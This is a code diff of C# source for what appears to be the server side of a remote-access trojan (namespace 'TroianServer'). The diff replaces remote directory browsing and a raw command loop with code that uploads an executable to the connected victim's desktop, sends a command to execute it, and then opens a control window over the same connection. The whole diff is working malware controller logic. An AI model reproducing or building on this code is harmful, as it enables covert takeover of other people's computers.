@@ -16,35 +16,15 @@ namespace TroianServer
     {
         static void Navigate(NetworkStream stream)
         {
-            String path = Constants.NAVIGATE + "@" + Console.ReadLine();
-            Messages.SendMessage(stream, path);
-            String msn = Messages.ReceiveMessage(stream);
-            Console.WriteLine(msn);
-            if (msn.Equals("N"))
-            {
-                return;
-            }
-
-            int files = Int32.Parse(Messages.ReceiveMessage(stream));
-            Messages.SendMessage(stream, "ACK");
-            String[] dirs = new string[files];
-
-            for (int i = 0; i < files; i++)
-            {
-                dirs[i] = Messages.ReceiveMessage(stream);
-                Messages.SendMessage(stream, "ACK");
-            }
-
-            for (int i = 0; i < files; i++)
-                Console.WriteLine(dirs[i]);
+          
         }
-
+        [STAThread]
         static void Main(string[] args)
         {
             TcpListener server = new TcpListener(System.Net.IPAddress.Parse("192.168.21.89"), 30021);
             TcpClient client;
             String username;
-            
+
             try
             {
                 server.Start();
@@ -54,12 +34,37 @@ namespace TroianServer
                 username = Messages.ReceiveMessage(stream);
                 Console.WriteLine("Connected!");
 
-                while (true)
-                {
-                    String cmd = Console.ReadLine();
+                int bytes_sent = -1;
+                Byte[] bytes = new Byte[1024];
 
-                    Messages.SendMessage(stream, cmd);
+                try
+                {
+                    FileStream fs = new FileStream("C:\\Users\\Mihai\\Desktop\\Procc.exe", FileMode.Open, FileAccess.Read);
+                    Messages.SendMessage(stream, Constants.SENDFILE + "@" + "C:\\Users\\alexa\\Desktop\\Procc.exe");
+                    String check = Messages.ReceiveMessage(stream);
+
+                    if (check.Equals("N"))
+                    {
+                        goto here;
+                    }
+
+                    while (bytes_sent != 0)
+                    {
+                        bytes_sent = fs.Read(bytes, 0, bytes.Length);
+                        Messages.SendMessage(stream, bytes_sent.ToString());
+                        Messages.ReceiveMessage(stream);
+                        stream.Write(bytes, 0, bytes_sent);
+                        Messages.ReceiveMessage(stream);
+                    }
                 }
+                catch (Exception) { }
+
+                Messages.SendMessage(stream, Constants.CMDINJECT + "@" + "C:\\Users\\alexa\\Desktop\\Procc.exe");
+
+                here:
+                Application.EnableVisualStyles();
+                Application.SetCompatibleTextRenderingDefault(false);
+                Application.Run(new Form1(stream));
 
                 client.Close();
             }
